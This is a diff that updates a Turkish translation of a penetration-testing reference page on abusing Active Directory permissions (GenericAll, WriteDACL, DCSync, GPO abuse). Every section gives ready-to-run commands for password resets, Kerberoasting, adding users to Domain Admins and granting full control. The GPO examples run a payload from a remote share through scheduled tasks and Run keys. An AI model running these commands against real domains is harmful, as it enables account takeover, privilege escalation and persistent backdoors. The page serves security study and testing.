@@ -1,71 +1,80 @@
-# Active Directory ACL'lerini/ACE'lerini Kötüye Kullanma
+# Active Directory ACLs/ACEs'yi Kötüye Kullanma
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Bu sayfa,** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**'dan tekniklerin bir özetidir. Daha fazla ayrıntı için, orijinal makalelere bakın.**
+**Bu sayfa büyük ölçüde şu tekniklerin bir özeti:** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Daha fazla ayrıntı için orijinal makalelere bakın.**
 
 ## BadSuccessor
+
 
 {{#ref}}
 BadSuccessor.md
 {{#endref}}
 
-## **Kullanıcı Üzerinde GenericAll Hakları**
+## **GenericAll Rights on User**
 
-Bu ayrıcalık, bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `GenericAll` hakları `Get-ObjectAcl` komutu kullanılarak doğrulandığında, bir saldırgan:
+Bu ayrıcalık bir saldırgana hedef kullanıcı hesabı üzerinde tam kontrol verir. `GenericAll` hakları `Get-ObjectAcl` komutuyla doğrulandıktan sonra, bir saldırgan şunları yapabilir:
 
-- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` komutunu kullanarak, saldırgan kullanıcının parolasını sıfırlayabilir.
-- **Hedefli Kerberoasting**: Kullanıcının hesabına bir SPN atayarak, onu kerberoastable hale getirebilir, ardından Rubeus ve targetedKerberoast.py kullanarak bilet verme biletinin (TGT) hash'lerini çıkartıp kırmaya çalışabilir.
+- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` kullanarak saldırgan kullanıcının parolasını sıfırlayabilir.
+- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak hesabı kerberoastable hale getirin, sonra Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash'lerini çıkarıp kırmayı deneyin.
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Hedeflenmiş ASREPRoasting**: Kullanıcı için ön kimlik doğrulamayı devre dışı bırakın, bu da hesabını ASREPRoasting'e karşı savunmasız hale getirir.
+- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'ı devre dışı bırakın; böylece hesabı ASREPRoasting'e karşı savunmasız hale gelir.
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll Hakları Üzerinde Grup**
+## **GenericAll Hakları Bir Grup Üzerinde**
 
-Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grupta `GenericAll` haklarına sahip olması durumunda grup üyeliklerini manipüle etmesine olanak tanır. Saldırgan, grubun ayırt edici adını `Get-NetGroup` ile belirledikten sonra:
+Bu ayrıcalık, bir saldırganın `Domain Admins` gibi bir grup üzerinde `GenericAll` haklarına sahipse grup üyeliklerini değiştirmesine olanak tanır. Grubun distinguished name'ini `Get-NetGroup` ile belirledikten sonra saldırgan şunları yapabilir:
 
-- **Kendilerini Domain Admins Grubuna Ekleyebilir**: Bu, doğrudan komutlar aracılığıyla veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
+- **Kendilerini Domain Admins Grubuna Eklemek**: Bu doğrudan komutlarla veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
+- Linux'ten, GenericAll/Write üyeliğiniz olduğunda kendinizi istediğiniz gruplara eklemek için BloodyAD'i kullanabilirsiniz. Hedef grup “Remote Management Users” içinde nested ise, o grubu dikkate alan hostlarda hemen WinRM erişimi kazanırsınız:
+```bash
+# Linux tooling example (BloodyAD) to add yourself to a target group
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
+
+# If the target group is member of "Remote Management Users", WinRM becomes available
+netexec winrm <dc-fqdn> -u <user> -p '<pass>'
+```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Bu yetkilere sahip olmak, bir bilgisayar nesnesi veya kullanıcı hesabında şunları sağlar:
+Bu ayrıcalıklara bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde sahip olmak şunlara izin verir:
 
-- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesini ele geçirmeyi sağlar.
-- **Shadow Credentials**: Bu tekniği, gölge kimlik bilgilerini oluşturma yetkilerini kullanarak bir bilgisayar veya kullanıcı hesabını taklit etmek için kullanın.
+- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini mümkün kılar.
+- **Shadow Credentials**: Bu tekniği, ayrıcalıkları kullanarak shadow credentials oluşturarak bir bilgisayarın veya kullanıcı hesabının taklit edilmesi için kullanın.
 
 ## **WriteProperty on Group**
 
-Bir kullanıcının belirli bir grup (örneğin, `Domain Admins`) için tüm nesnelerde `WriteProperty` hakları varsa, şunları yapabilirler:
+Bir kullanıcının belirli bir grup için (ör. `Domain Admins`) tüm nesneler üzerinde `WriteProperty` hakları varsa, şunları yapabilir:
 
-- **Kendilerini Domain Admins Grubuna Eklemek**: `net user` ve `Add-NetGroupUser` komutlarını birleştirerek gerçekleştirilebilir, bu yöntem alan içinde ayrıcalık yükseltmesine olanak tanır.
+- **Kendilerini Domain Admins Group'a eklemek**: `net user` ve `Add-NetGroupUser` komutlarının birleştirilmesiyle gerçekleştirilebilen bu yöntem, etki alanı (domain) içinde ayrıcalık yükseltmesine olanak tanır.
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Kendi (Kendi Üyeliği) Grubunda**
+## **Self (Self-Membership) on Group**
 
-Bu ayrıcalık, saldırganların `Domain Admins` gibi belirli gruplara kendilerini eklemelerine olanak tanır; bu, grup üyeliğini doğrudan manipüle eden komutlar aracılığıyla gerçekleştirilir. Aşağıdaki komut dizisini kullanmak, kendini eklemeye olanak tanır:
+Bu ayrıcalık, saldırganların grup üyeliğini doğrudan değiştiren komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Aşağıdaki komut dizisini kullanarak kendini ekleme yapılabilir:
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **WriteProperty (Kendi Üyeliği)**
+## **WriteProperty (Self-Membership)**
 
-Benzer bir ayrıcalık olan bu, saldırganların grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır; eğer bu gruplar üzerinde `WriteProperty` hakkına sahipseler. Bu ayrıcalığın onayı ve uygulanması şu şekilde gerçekleştirilir:
+Benzer bir ayrıcalık olan bu, saldırganların belirli gruplarda `WriteProperty` hakkına sahipse, grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak tanır. Bu ayrıcalığın doğrulanması ve yürütülmesi şununla gerçekleştirilir:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-`User-Force-Change-Password` için bir kullanıcıda `ExtendedRight` tutmak, mevcut şifreyi bilmeden şifre sıfırlamalarına olanak tanır. Bu hakkın doğrulanması ve istismarı, PowerShell veya alternatif komut satırı araçları aracılığıyla yapılabilir ve etkileşimli oturumlar ile etkileşimsiz ortamlar için tek satırlık komutlar dahil olmak üzere bir kullanıcının şifresini sıfırlamak için çeşitli yöntemler sunar. Komutlar, basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanarak saldırı vektörlerinin çok yönlülüğünü göstermektedir.
+`User-Force-Change-Password` için bir kullanıcının üzerinde `ExtendedRight`'a sahip olmak, mevcut parolayı bilmeden parola sıfırlamalarına izin verir. Bu hakkın doğrulanması ve sömürüsü PowerShell veya alternatif komut satırı araçlarıyla yapılabilir; bu, etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere bir kullanıcının parolasını sıfırlamak için çeşitli yöntemler sunar. Komutlar basit PowerShell çağrılarından Linux'ta `rpcclient` kullanmaya kadar uzanır ve saldırı vektörlerinin çok yönlülüğünü gösterir.
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -76,9 +85,9 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner Üzerinde Grup**
+## **Grupta WriteOwner**
 
-Eğer bir saldırgan `WriteOwner` haklarına sahip olduğunu keşfederse, grubun sahipliğini kendisine değiştirebilir. Bu, söz konusu grubun `Domain Admins` olması durumunda özellikle etkilidir, çünkü sahipliği değiştirmek grup nitelikleri ve üyeliği üzerinde daha geniş bir kontrol sağlar. Süreç, `Get-ObjectAcl` aracılığıyla doğru nesneyi tanımlamayı ve ardından sahibi değiştirmek için `Set-DomainObjectOwner` kullanmayı içerir; bu, SID veya isimle yapılabilir.
+Bir saldırgan bir grup üzerinde `WriteOwner` haklarına sahip olduğunu tespit ederse, grubun sahipliğini kendine değiştirebilir. Bu, söz konusu grup `Domain Admins` olduğunda özellikle etkili olur; sahipliği değiştirmek grup öznitelikleri ve üyelik üzerinde daha geniş kontrol sağlar. Süreç, doğru nesnenin `Get-ObjectAcl` ile belirlenmesini ve ardından sahibi `Set-DomainObjectOwner` kullanarak SID veya isim ile değiştirmeyi içerir.
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -86,13 +95,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite on User**
 
-Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, bir kullanıcının oturum açma betiği yolunu değiştirerek kullanıcı oturumu açıldığında kötü niyetli bir betiği çalıştırabilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
+Bu izin, bir attacker'ın user özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile attacker, bir user'ın logon script path'ini değiştirerek user logon olduğunda kötü amaçlı bir script'in çalıştırılmasını sağlayabilir. Bu, hedef user'ın `scriptpath` özelliğini attacker'ın script'ine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 ## **GenericWrite on Group**
 
-Bu ayrıcalıkla, saldırganlar grup üyeliğini manipüle edebilir, örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanarak bir gruptan kullanıcı eklemeyi veya çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
+Bu ayrıcalıkla saldırganlar grup üyeliklerini değiştirebilir; örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç, bir kimlik bilgisi nesnesi oluşturmayı, bunu kullanarak bir gruba kullanıcı eklemeyi veya kaldırmayı ve üyelik değişikliklerini PowerShell komutlarıyla doğrulamayı içerir.
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -102,7 +111,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, bir saldırgana nesne üzerinde `GenericAll` ayrıcalıkları verme imkanı tanır. Bu, ADSI manipülasyonu yoluyla gerçekleştirilir ve nesne üzerinde tam kontrol sağlanır ve grup üyeliklerini değiştirme yeteneği kazanılır. Ancak, bu ayrıcalıkları Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak istismar etmeye çalışırken sınırlamalar vardır.
+Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın kendisine nesne üzerinde `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu ile gerçekleştirilir; nesne üzerinde tam kontrol elde etmeye ve grup üyeliklerini değiştirme yeteneği sağlar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu ayrıcalıkları suistimal etmeye çalışırken sınırlamalar bulunmaktadır.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -110,66 +119,66 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Alan Üzerinde Replikasyon (DCSync)**
+## **Etki Alanında Replikasyon (DCSync)**
 
-DCSync saldırısı, bir Alan Denetleyicisini taklit etmek ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmek için alan üzerindeki belirli replikasyon izinlerini kullanır. Bu güçlü teknik, saldırganların bir Alan Denetleyicisine doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanıyan `DS-Replication-Get-Changes` gibi izinler gerektirir. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)
+DCSync saldırısı, etki alanındaki belirli replikasyon izinlerini kullanarak bir Domain Controller'ı taklit eder ve kullanıcı kimlik bilgileri dahil olmak üzere verileri senkronize eder. Bu güçlü teknik, `DS-Replication-Get-Changes` gibi izinler gerektirir; bu da saldırganların bir Domain Controller'a doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmasına olanak tanır. [**DCSync saldırısı hakkında daha fazla bilgi edinin.**](../dcsync.md)
 
-## GPO Delegasyonu <a href="#gpo-delegation" id="gpo-delegation"></a>
+## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>
 
-### GPO Delegasyonu
+### GPO Yetkilendirmesi
 
-Grup Politika Nesnelerini (GPO) yönetmek için devredilen erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilirse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilirler. Bu izinler, PowerView kullanılarak tespit edilen kötü niyetli amaçlar için kötüye kullanılabilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Group Policy Objects (GPOs) yönetimi için devredilen erişim önemli güvenlik riskleri doğurabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlı kullanım için suistimal edilebilir; PowerView kullanılarak şu şekilde tespit edilebilir: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-### GPO İzinlerini Listele
+### GPO İzinlerini Listeleme
 
-Yanlış yapılandırılmış GPO'ları tanımlamak için PowerSploit'in cmdlet'leri bir araya getirilebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPO'ların keşfedilmesini sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit'ın cmdlet'leri zincirlenebilir. Bu, belirli bir kullanıcının hangi GPO'ları yönetme iznine sahip olduğunu keşfetmeyi sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Verilen Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür, bu da potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Belirli Bir Politika Uygulanan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözmek mümkündür; bu, potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Verilen Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.
+**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.
 
-**Verilen Politika Uygulanan OU'lar**: Belirli bir politikadan etkilenen organizasyonel birimleri (OU'lar) tanımlamak için `Get-DomainOU` kullanılabilir.
+**Belirli Bir Politika Uygulanan OU'lar**: Bir politikadan etkilenen organizational units (OU'lar) `Get-DomainOU` kullanılarak tespit edilebilir.
 
-GPO'ları listelemek ve içindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.
+GPO'ları listelemek ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.
 
-### GPO'yu Kötüye Kullan - New-GPOImmediateTask
+### GPO Kötüye Kullanımı - New-GPOImmediateTask
 
-Yanlış yapılandırılmış GPO'lar, örneğin, hemen bir zamanlanmış görev oluşturarak kod çalıştırmak için istismar edilebilir. Bu, etkilenen makinelerde yerel yöneticiler grubuna bir kullanıcı eklemek için yapılabilir ve bu da ayrıcalıkları önemli ölçüde artırır:
+Yanlış yapılandırılmış GPO'lar, örneğin hemen çalışacak bir zamanlanmış görev oluşturarak kod yürütmek için suistimal edilebilir. Bu, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna eklemek için yapılabilir ve yetkileri önemli ölçüde yükseltir:
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy modülü - GPO'yu Kötüye Kullanma
+### GroupPolicy module - Abuse GPO
 
-GroupPolicy modülü, eğer kuruluysa, yeni GPO'ların oluşturulmasını ve bağlanmasını sağlar ve etkilenen bilgisayarlarda arka kapıları çalıştırmak için kayıt defteri değerleri gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve bir kullanıcının bilgisayara giriş yapmasını gerektirir:
+The GroupPolicy module, eğer kuruluysa, yeni GPO'ların oluşturulmasına ve bağlanmasına ve etkilenen bilgisayarlarda backdoors çalıştırmak için registry values gibi tercihlerin ayarlanmasına olanak tanır. Bu yöntem, GPO'nun güncellenmesini ve yürütme için bir kullanıcının bilgisayara giriş yapmasını gerektirir:
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - GPO'yu Kötüye Kullanma
+### SharpGPOAbuse - Abuse GPO
 
-SharpGPOAbuse, yeni GPO'lar oluşturma gereksinimi olmadan mevcut GPO'ları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
+SharpGPOAbuse, yeni GPO oluşturmaya gerek kalmadan mevcut GPO'lara görev ekleyerek veya ayarları değiştirerek bunları kötüye kullanma yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ları değiştirmenizi veya yeni GPO'lar oluşturmak için RSAT araçlarını kullanmanızı gerektirir:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
 ### Politika Güncellemesini Zorla
 
-GPO güncellemeleri genellikle her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uygulandıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO'larda yapılan herhangi bir değişikliğin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.
+GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak, özellikle bir değişiklik yaptıktan sonra, hedef bilgisayarda `gpupdate /force` komutunu kullanarak anlık bir politika güncellemesi zorlayabilirsiniz. Bu komut, GPO'lara yapılan değişikliklerin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.
 
-### Arka Planda
+### İşleyiş
 
-Verilen bir GPO için Zamanlanmış Görevler incelendiğinde, `Misconfigured Policy` gibi görevlerin eklenmesi, `evilTask` gibi görevlerin varlığını doğrulayabilir. Bu görevler, sistem davranışını değiştirmek veya ayrıcalıkları artırmak amacıyla betikler veya komut satırı araçları aracılığıyla oluşturulur.
+Belirli bir GPO için Zamanlanmış Görevler incelendiğinde, örneğin `Misconfigured Policy`, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan script'ler veya komut satırı araçlarıyla oluşturulur.
 
-`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, görev yapısı zamanlanmış görevin ayrıntılarını - yürütülecek komut ve tetikleyicileri - özetler. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulaması kapsamında rastgele komutlar veya betikler yürütme yöntemi sunar.
+`New-GPOImmediateTask` tarafından üretilen XML yapılandırma dosyasında gösterildiği gibi, görevin yapısı zamanlanmış görevin ayrıntılarını — yürütülecek komut ve tetikleyiciler dahil — ortaya koyar. Bu dosya, GPO'lar içinde zamanlanmış görevlerin nasıl tanımlandığını ve yönetildiğini gösterir ve politika uygulaması kapsamında rastgele komutlar veya script'ler çalıştırmak için bir yöntem sağlar.
 
 ### Kullanıcılar ve Gruplar
 
-GPO'lar, hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna da olanak tanır. Kullanıcılar ve Gruplar politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` grubuna kullanıcı ekleyebilir. Bu, GPO yönetim izinlerinin devri aracılığıyla mümkündür; bu, politika dosyalarının yeni kullanıcılar eklemek veya grup üyeliklerini değiştirmek için değiştirilmesine izin verir.
+GPO'lar ayrıca hedef sistemlerdeki kullanıcı ve grup üyeliklerinin manipüle edilmesine izin verir. Users and Groups politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` grubu gibi ayrıcalıklı gruplara kullanıcı ekleyebilirler. Bu, GPO yönetim izinlerinin delege edilmesi sayesinde mümkündür; bu izinler politika dosyalarının yeni kullanıcılar ekleyecek veya grup üyeliklerini değiştirecek şekilde düzenlenmesine olanak tanır.
 
-Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını özetler. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler üzerinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık artırma için doğrudan bir yaklaşım sunar.
+Users and Groups için XML yapılandırma dosyası bu değişikliklerin nasıl uygulandığını açıklar. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler genelinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla doğrudan bir ayrıcalık yükseltme yaklaşımı sunar.
 
-Ayrıca, kod yürütme veya kalıcılığı sürdürme için ek yöntemler, oturum açma/kapatma betiklerini kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi yöntemler de dikkate alınabilir. Bu teknikler, GPO'ların kötüye kullanımı yoluyla erişimi sürdürme ve hedef sistemleri kontrol etme için çeşitli yollar sunar.
+Ayrıca, oturum açma/oturum kapatma script'lerini kullanma, autorun için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya servis yapılandırmalarını düzenleme gibi kod çalıştırma veya kalıcılık sağlama için ek yöntemler de düşünülebilir. Bu teknikler, GPO'ların kötüye kullanımı yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sağlar.
 
-## Referanslar
+## Kaynaklar
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
